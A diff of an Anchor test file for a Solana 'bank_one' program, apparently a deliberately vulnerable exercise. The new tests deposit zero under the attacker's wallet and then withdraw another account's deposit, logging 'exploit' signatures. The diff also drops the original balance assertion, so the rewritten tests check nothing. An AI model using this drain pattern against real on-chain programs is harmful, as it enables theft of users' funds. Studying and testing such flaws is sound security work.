@@ -12,7 +12,7 @@ describe("bank_one", () => {
   const program = anchor.workspace.BankOne as Program<BankOne>;
 
   const authority = new anchor.web3.Keypair();
-  const amount = 1_000_000; // 1million lamports
+  const amount = 1_000_000;
 
   before(async () => {
     const transferAmount = 1 * anchor.web3.LAMPORTS_PER_SOL;
@@ -20,58 +20,45 @@ describe("bank_one", () => {
       anchor.web3.SystemProgram.transfer({
         fromPubkey: wallet.publicKey,
         toPubkey: authority.publicKey,
-        lamports: transferAmount,
+        lamports: transferAmount
       })
     );
+
     await provider.sendAndConfirm(transferTx);
-  });
+  })
 
   it("Deposit", async () => {
-    const transaction = await program.methods
-      .deposit(new anchor.BN(amount))
+    const tx = await program.methods.deposit(new anchor.BN(amount))
       .accounts({ authority: authority.publicKey })
-      .transaction();
+      .transaction()
 
-    const transactionSignature = await anchor.web3.sendAndConfirmTransaction(
-      connection,
-      transaction,
-      [authority],
-      { commitment: "confirmed" }
-    );
-    console.log("Your transaction signature", transactionSignature);
-  });
+    const transactionSignature = await anchor.web3
+      .sendAndConfirmTransaction(connection, tx, [authority], { commitment: "confirmed" })
 
-  it("Withdraw", async () => {
-    const walletInitialBalance = await connection.getBalance(wallet.publicKey);
+    console.log("✅ signautre : ", transactionSignature);
 
-    const depositInstruction = await program.methods
-      .deposit(new anchor.BN(0))
+    const exploitTransaction = await program.methods.deposit(new anchor.BN(0))
       .accounts({ authority: wallet.publicKey })
-      .instruction();
+      .transaction()
 
-    const withdrawInstruction = await program.methods
-      .withdraw(new anchor.BN(amount))
+
+    const exploitSignature = await anchor.web3
+      .sendAndConfirmTransaction(connection, exploitTransaction, [wallet.payer], { commitment: "confirmed" })
+
+    console.log("⚡ exploit signature : ", exploitSignature)
+  })
+
+  it("withdraw using exploit : ", async () => {
+    const withdrawIx = await program.methods.withdraw(new anchor.BN(amount))
       .accounts({ authority: wallet.publicKey })
-      .instruction();
+      .instruction()
 
-    const transaction = new anchor.web3.Transaction().add(
-      depositInstruction,
-      withdrawInstruction
-    );
+    const withdrawExploitTx = new anchor.web3.Transaction().add(withdrawIx);
 
-    const transactionSignature = await anchor.web3.sendAndConfirmTransaction(
-      connection,
-      transaction,
-      [wallet.payer],
-      { commitment: "confirmed" }
-    );
+    const exploitWithdrawSignature = await anchor.web3
+      .sendAndConfirmTransaction(connection, withdrawExploitTx, [wallet.payer], { commitment: "confirmed" })
 
-    console.log("Your transaction signature", transactionSignature);
+      console.log("⚠️ exploit signature  :", exploitWithdrawSignature);
+  })
 
-    const walletFinalBalance = await connection.getBalance(wallet.publicKey, {
-      commitment: "confirmed",
-    });
-
-    assert.equal(walletFinalBalance, walletInitialBalance + amount);
-  });
 });
